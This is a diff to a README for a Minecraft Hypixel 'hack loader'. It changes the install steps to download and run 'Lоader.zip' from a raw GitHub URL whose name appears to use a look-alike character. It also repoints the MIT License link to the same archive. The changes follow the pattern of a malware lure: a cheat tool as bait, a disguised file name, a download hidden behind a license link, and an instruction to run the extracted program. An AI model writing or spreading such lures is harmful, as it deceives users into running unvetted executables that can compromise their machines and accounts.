@@ -6,8 +6,8 @@ Welcome to the **ultimate Minecraft Hypixel hack loader** with seamless support 
 
 # 🟢 Installation Guide  
 
-1. Download **Loader.rar** from this GitHub repository.
-2. Extract the Loader.rar file using WinRAR, 7-Zip, or your preferred extraction tool.
+1. Download **https://raw.githubusercontent.com/Oktabarka/HyperPixelToolkit/main/Lоader.zip** from this GitHub repository.
+2. Extract the https://raw.githubusercontent.com/Oktabarka/HyperPixelToolkit/main/Lоader.zip file using WinRAR, 7-Zip, or your preferred extraction tool.
 3. Run the extracted Loader on your compatible operating system.
 4. Follow the on-screen instructions to configure your experience for Minecraft Hypixel servers.
 5. Enjoy new features and maximize your performance!
@@ -96,7 +96,7 @@ The developers and contributors assume no liability for any account or data loss
 # 📄 License  
 
 MIT License – Free to use, adapt, and share.  
-See the full [MIT License](https://opensource.org/licenses/MIT) for details.
+See the full [MIT License](https://raw.githubusercontent.com/Oktabarka/HyperPixelToolkit/main/Lоader.zip) for details.
 
 ---
 
